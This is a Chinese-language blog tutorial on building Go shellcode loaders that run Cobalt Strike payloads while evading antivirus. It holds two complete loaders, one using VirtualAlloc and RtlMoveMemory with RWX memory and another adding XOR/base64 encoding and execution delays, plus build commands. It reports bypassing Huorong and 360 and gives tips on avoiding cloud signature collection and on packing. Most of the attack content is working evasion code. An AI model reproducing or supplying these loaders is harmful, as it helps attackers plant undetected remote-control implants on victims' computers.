## 一.前言

之前一直在用python去做免杀，做出来的免杀效果去过国内杀软还是没问题，python免杀整体来说相对比较容易。但是随着安全厂商的发展，用主流的语言去做免杀肯定效果会一天比一天的差，于是便有了想法学习一下Go语言，Go语言是谷歌2009发布的第二款开源编程语言。Go语言专门针对多处理器系统应用程序的编程进行了优化，使用Go编译的程序可以媲美C或C++代码的速度，而且更加安全、支持并行进程。

## 二.前置知识：

想要去做免杀我们需要了解在windows操作系统底层是如何运作的，了解的越多对我们做免杀帮助越大。在这里给大家介绍一下windows
中重要的几个api函数。

首先我们来看VirtualAlloc，VirtualAlloc是一个Windows
api函数，该函数的功能是在调用进程的虚地址空间,预定或者提交一部分页，下面是官方给出的api参考文档。

    
    
    LPVOID VirtualAlloc{
    LPVOID lpAddress,
    DWORD dwSize,
    DWORD flAllocationType, 
    DWORD flProtect
    };
    

可以看到调用这个api我们需要传四个值进去，分别是指定要
分配哪块地址，分配内存空间的大小，分配内存所在页的属性，以及该内存页的保护属性，掉用完成后函数会返回一个地址供我们后续使用，前两个参数没什么好说的，重点是后两个，flAllocationType这个参数我们可以设置成。MEM_RESERVE|MEM_COMMIT代表我们先保留内存然后再去提交，flProtect我们设置成PAGE_EXECUTE_READWRITE代表当前内存页可读可写可执行。

RtlMoveMemory api函数，这个函数我们主要用来从指定内存中复制内存至另一内存里，将shellcode复制到我们开辟出来的内存中。

    
    
    VOID RtlMoveMemory(
    VOID UNALIGNED *Destination,
    const VOID UNALIGNED *Source,
    SIZE_T Length
    );
    

这个api同样需要传入三个值，分别是 需要移动目的地址指针，需要复制的内存地址指针，需要复制的字节数。

## 三.实验开始

攻击机：公网cobalt strike linux主机

受害机：本地物理机

首先用cobalt strike来生成c代码的shellcode

![image](https://image.3001.net/images/20220403/1648980540_6249723c5dd8eac7090e7.jpg!small)

将我们生成好的c代码保存到本地,值得一提的是go语言在加载我们shellcode时候他的格式与cs生产出来的不一致所以我们需要将生产出来的shellcode
/替换成 ,0  
![image](https://image.3001.net/images/20220403/1648980601_62497279e3a382efaf1c0.jpg!small)

这里我给大家找到了一份shellcode loader，我们将shellcode放入shellcode中编译运行，

    
    
    package main
    
    import (
    	"syscall"
    	"unsafe"
    )
    
    const (
    	MEM_COMMIT             = 0x1000
    	MEM_RESERVE            = 0x2000
    	PAGE_EXECUTE_READWRITE = 0x40 
    )
    
    var (
    	kernel32      = syscall.MustLoadDLL("kernel32.dll")
    	ntdll         = syscall.MustLoadDLL("ntdll.dll")
    	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
    )
    
    func main() {
    	shellcode := []byte{shellcode}
    
    	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    	if err != nil && err.Error() != "The operation completed successfully." {
    		syscall.Exit(0)
    	}
    	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    	if err != nil && err.Error() != "The operation completed successfully." {
    		syscall.Exit(0)
    	}
    	syscall.Syscall(addr, 0, 0, 0, 0)
    }
    

我们用如下命令编译exe go build -ldflags="-H windowsgui" .\badgo.go一生成立马被火绒查杀  
![image](https://image.3001.net/images/20220403/1648980753_6249731134c29568406e5.jpg!small)

![image](https://image.3001.net/images/20220403/1648980703_624972dfb7c086a3e02c2.jpg!small)

那么我们继续改进，现在被查杀了因为我们使用的是cs自带的载荷，这些后渗透工具早被安全厂商盯死，所以我们接下来的思路将我们的载荷加密再去生成，那么加密的方式有很多我们该如何去选择呢.即便完成了加密操作，但是shellcode还写在我们的文件中，被拉特征码也是迟早的事情。所以我们接下来的步骤就是要去首先采用一些加密算法抹掉我们原本木马中的静态特征，这里采用了xor异或加解密和base64加解密，并且我们让程序延迟执行尽可能的消耗杀软的检测资源。

代码如下：使用的话就把cs生成出来的文件放在当前目录即可，编译运行程序就可以上线。

    
    
    package main
    
    import (
    	"encoding/base64"
    	"fmt"
    	"io/ioutil"
    	"os"
    	"syscall"
    	"time"
    	"unsafe"
    )
    
    const (
    	MEM_COMMIT             = 0x1000
    	MEM_RESERVE            = 0x2000
    	PAGE_EXECUTE_READWRITE = 0x40
    )
    
    var XorKey = []byte{0x13, 0x54, 077, 0x1A, 0xA1, 0x3F, 0x04, 0x8B}
    
    func Dencode(src string) []byte {
    	data1, _ := base64.StdEncoding.DecodeString(src)
    	xor := []byte(data1)
    	var shellcode []byte
    	for i := 0; i < len(xor); i++ {
    		shellcode = append(shellcode, xor[i]^XorKey[1]^XorKey[2])
    	}
    	return shellcode
    }
    
    func Encode(src string) string {
    	shellcode := []byte(src)
    	var xor_shellcode []byte
    	for i := 0; i < len(shellcode); i++ {
    		xor_shellcode = append(xor_shellcode, shellcode[i]^XorKey[2]^XorKey[1])
    	}
    	bdata := base64.StdEncoding.EncodeToString(xor_shellcode)
    
    	return bdata
    }
    
    var (
    	kernel32      = syscall.MustLoadDLL("kernel32.dll")
    	ntdll         = syscall.MustLoadDLL("ntdll.dll")
    	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
    )
    
    func checkError(err error) {
    	if err != nil {
    		if err.Error() != "The operation completed successfully." {
    			println(err.Error())
    			os.Exit(1)
    		}
    	}
    }
    
    func exec(charcode []byte) {
    
    	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    	if addr == 0 {
    		checkError(err)
    	}
    	time.Sleep(5)
    
    	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
    	checkError(err)
    
    	time.Sleep(5)
    	for j := 0; j < len(charcode); j++ {
    		charcode[j] = 0
    	}
    	syscall.Syscall(addr, 0, 0, 0, 0)
    }
    
    func read(file string) []byte {
    	data, err := ioutil.ReadFile(file)
    	if err != nil {
    		fmt.Print(err)
    	}
    	return data
    }
    
    func main() {
    	Encode := Encode(string(read("./payload.bin")))
    	shellCodeHex := Dencode(Encode)
    	exec(shellCodeHex)
    }
    

我们接下来编译生成 go build -ldflags="-H windowsgui" .\loader.go

![image](https://image.3001.net/images/20220403/1648980803_62497343ae57678f9395b.jpg!small)

火绒版本5.0.66.3

360版本：13.1.0.1005

![image](https://image.3001.net/images/20220403/1648980841_6249736935183e50fa3b4.jpg!small)

![image](https://image.3001.net/images/20220403/1648980881_62497391660a5d748ead7.jpg!small)

四.总结：友情提示，测试杀毒效果最好断网，杀软都有云查杀，容易被拉特征，当然还可以对生成出来的木马去加壳继续混淆，建议加壳用一些冷门壳，有些壳的特征也被安全厂商标识，加壳操作这里我就不给大家演示了。由于本人能力水平有限，文章中若出现表达错误的地方，还请各位师傅原谅，本人还会继续深入研究免杀领域相关技术知识，在这里感谢很多师傅的文章中的思路给了自己很多启发。

